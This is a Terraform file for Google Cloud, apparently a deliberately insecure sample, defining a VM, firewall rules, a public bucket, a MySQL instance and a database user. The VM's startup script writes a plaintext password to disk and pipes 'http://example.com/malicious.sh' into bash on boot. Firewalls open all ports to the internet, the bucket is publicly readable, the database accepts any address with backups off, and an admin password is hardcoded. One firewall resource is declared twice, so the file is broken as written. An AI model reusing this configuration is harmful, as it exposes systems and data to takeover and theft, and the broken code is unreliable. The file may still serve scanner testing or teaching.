provider "google" {
  project = "my-gcp-project"
  region  = "us-central1"
  zone    = "us-central1-a"
}

resource "google_compute_instance" "web_server" {
  name         = "web-server"
  machine_type = "f1-micro"
  zone         = "us-central1-a"

  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-11"
    }
  }

  network_interface {
    network = "default"
    access_config {}
  }

  metadata_startup_script = <<-EOF
    #!/bin/bash
    echo "Sensitive data: password12345" > /etc/secret.txt
    curl http://example.com/malicious.sh | bash
  EOF

  tags = ["web"]
}

resource "google_compute_firewall" "web_sg" {
  name    = "web-sg1"
  network = "default"

  allow {
    protocol = "tcp"
    ports    = ["0-65535"]
  }

  allow {
    protocol = "udp"
    ports    = ["0-65535"]
  }

  source_ranges = ["0.0.0.0/0"]
  target_tags   = ["web"]
}

resource "google_storage_bucket" "app_data_bucket" {
  name                        = "my-app-data-bucket-123456"
  location                    = "US"
  force_destroy               = true
  uniform_bucket_level_access = false

  website {
    main_page_suffix = "index.html"
    not_found_page   = "404.html"
  }

  lifecycle_rule {
    action {
      type = "Delete"
    }

    condition {
      age = 7
    }
  }
}

resource "google_storage_bucket_iam_binding" "public_read" {
  bucket = google_storage_bucket.app_data_bucket.name

  role    = "roles/storage.objectViewer"
  members = ["allUsers"]
}

resource "google_sql_database_instance" "app_database" {
  name             = "app-db-instance"
  database_version = "MYSQL_5_7"
  region           = "us-central1"

  settings {
    tier = "db-f1-micro"

    backup_configuration {
      enabled = false
    }

    ip_configuration {
      ipv4_enabled = true
      authorized_networks {
        name  = "allow-all"
        value = "0.0.0.0/0"
      }
    }
  }

  deletion_protection = false
}

resource "google_compute_firewall" "web_sg" {
  name    = "web-sg"
  network = "default"

  allow {
    protocol = "tcp"
    ports    = ["0-65535"]
  }

  allow {
    protocol = "udp"
    ports    = ["0-65535"]
  }

  source_ranges = ["0.0.0.0/0"]
  target_tags   = ["web"]
}

resource "google_sql_user" "db_user" {
  name     = "admin"
  instance = google_sql_database_instance.app_database.name
  password = "R@nd0mP@ss12345"
}
